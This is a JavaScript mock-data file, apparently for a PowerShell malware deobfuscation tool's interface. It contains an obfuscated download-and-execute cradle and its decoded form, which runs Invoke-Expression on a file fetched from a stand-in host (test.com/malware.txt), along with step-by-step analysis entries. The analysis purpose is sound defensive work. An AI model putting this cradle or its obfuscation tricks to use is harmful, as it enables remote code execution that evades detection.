export const MOCK_ANALYSIS_RESULT = {
    jobId: "CASE-3891",
    timestamp: new Date().toLocaleString(),
    status: "Malicious",
    threat_level: "High",
    
    // 1. Script Asli (Obfuscated)
    original_source: `Ie\`X ("{2}{0}{1}" -f 'ost h', 'ello', 'write-h')
$xdjmd  =  'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
$lsffs =  '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
$sdfs = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
.($psHoME[4]+$PShOmE[30]+'x') (Ne\`W-oB\`JeCt Net.Web\`C\`lient).downloadstring($sdfs)`,

    // 2. Hasil Akhir (Deobfuscated)
    deobfuscated_output: `Write-Host ([string]"hello")
$xdjmd = ([string]"aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG")
$lsffs = ([string]"8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA=")
$sdfs = ([string]"https://test.com/malware.txt")
."Invoke-Expression" (New-Object ([string]"Net.WebClient")).DownloadString(([string]"https://test.com/malware.txt"))`,

    // 3. Langkah-langkah (Diambil & diolah dari Raw Log File)
    steps: [
        { 
            id: 1, 
            type: "info", 
            timestamp: "00:00:01",
            title: "String Formatting Resolved",
            message: "Resolved format operator (-f) to reconstruction: 'write-host hello'",
            code_snippet: "\"{2}{0}{1}\" -f 'ost h', 'ello', 'write-h'" 
        },
        { 
            id: 2, 
            type: "warning", 
            timestamp: "00:00:02",
            title: "Suspicious Variable Assignment",
            message: "Detected obfuscated string assignment to variable $xdjmd",
            code_snippet: "$xdjmd = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQ...'" 
        },
        { 
            id: 3, 
            type: "warning", 
            timestamp: "00:00:02",
            title: "Suspicious Variable Assignment",
            message: "Detected obfuscated string assignment to variable $lsffs",
            code_snippet: "$lsffs = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHg...'" 
        },
        { 
            id: 4, 
            type: "success", 
            timestamp: "00:00:03",
            title: "Base64 Decoding Successful",
            message: "Combined variables and decoded Base64 string to URL.",
            code_snippet: "Result: https://test.com/malware.txt" 
        },
        { 
            id: 5, 
            type: "danger", 
            timestamp: "00:00:04",
            title: "Network Client Detected",
            message: "Script initialized 'Net.WebClient' for potential payload download.",
            code_snippet: "New-Object Net.WebClient" 
        },
        { 
            id: 6, 
            type: "danger", 
            timestamp: "00:00:05",
            title: "Execution Command Revealed",
            message: "Deobfuscated '.($psHoME[4]...)' to 'Invoke-Expression' (IEX). This executes the downloaded payload.",
            code_snippet: "Invoke-Expression (...).DownloadString(...)" 
        }
    ]
};

// Data History (Tetap sama seperti sebelumnya)
export const MOCK_HISTORY = [
    { id: 'CASE-3891', filename: 'malware_downloader.ps1', date: '2023-10-27', status: 'Dangerous' },
    { id: 'CASE-1002', filename: 'suspicious_script.txt', date: '2023-10-24', status: 'Safe' },
    { id: 'CASE-1003', filename: 'unknown_obfuscated.ps1', date: '2023-10-23', status: 'Warning' },
];